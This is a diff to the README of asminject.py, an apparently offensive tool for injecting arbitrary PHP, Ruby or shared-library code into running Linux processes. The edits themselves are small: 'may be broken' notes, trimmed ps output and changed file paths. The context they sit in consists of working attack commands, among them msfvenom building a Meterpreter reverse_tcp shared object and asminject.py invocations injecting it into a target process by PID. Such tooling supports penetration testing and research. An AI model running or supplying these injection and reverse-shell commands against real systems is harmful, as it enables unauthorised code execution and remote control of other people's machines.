@@ -96,6 +96,8 @@ If you're targeting a legacy Python 2 process instead of Python 3, you'll most l
 
 ## Execute arbitrary PHP code inside an existing PHP process
 
+*note: this may be broken for some versions of PHP 8.1*
+
 PHP has a similar "compile and execute this sequence of source code" method.
 
 This payload requires two variables: `phpcode`, which should contain the PHP code that should be executed in the existing PHP process, and `phpname`, which can generally be set to any string.
@@ -117,7 +119,7 @@ In a separate window, find the target process, and inject the code:
 ```
 # ps auxww | grep php | grep -v grep  
   
-root     2037629  1.0  0.5  68780 20212 pts/9    S+   13:40   0:00 php practice/php_loop.php
+root     2037629  [...] php practice/php_loop.php
 
 # python3 ./asminject.py 2037629 execute_php_code.s \
    --relative-offsets-from-binaries --stop-method "slow" \
@@ -135,6 +137,8 @@ Injected PHP code
 ```
 
 ## Execute arbitrary Ruby code inside an existing Ruby process
+
+*note: this may be broken at present*
 
 Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in `asminject.py` has a few limitations, but it does work:
 
@@ -160,7 +164,7 @@ In a separate window, find the target process, and inject the code:
 ```
 # ps auxww | grep ruby | grep -v grep
 
-root     2037714  2.0  0.3  77888 13580 pts/9    S+   13:44   0:00 ruby practice/ruby_loop.rb
+root     2037714  [...] ruby practice/ruby_loop.rb
 
 # python3 ./asminject.py 2037714 execute_ruby_code.s \
    --relative-offsets-from-binaries --stop-method "slow" \
@@ -247,6 +251,7 @@ Meterpreter  : x64/linux
 
 Warnings:
 
+* You will need to ctrl-C out of `asminject.py` once injection is successful.
 * The code for the original process will not continue executing after the shellcode is launched. See the threaded version below if you need that.
 * The original process will exit when Meterpreter exits.
 
@@ -276,7 +281,7 @@ This payload requires relative offsets for the `libdl` shared library used by th
 
 ```
 # msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so \
-   -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443
+   -o /home/user/lmrt11443.so LHOST=127.0.0.1 LPORT=11443
 
 # python3 ./asminject.py 1957286 dlinject.s \
    --relative-offsets-from-binaries --stop-method "slow" \
@@ -294,7 +299,8 @@ This payload requires one variable: `librarypath`, which should point to the lib
 This payload requires relative offsets for the `libdl` and `libpthread` shared libraries used by the target process.
 
 ```
-# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443
+# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so \
+   -o /home/user/lmrt11443.so LHOST=127.0.0.1 LPORT=11443
 
 # python3 ./asminject.py 1957286 dlinject_threaded.s \
    --relative-offsets-from-binaries --stop-method "slow" \
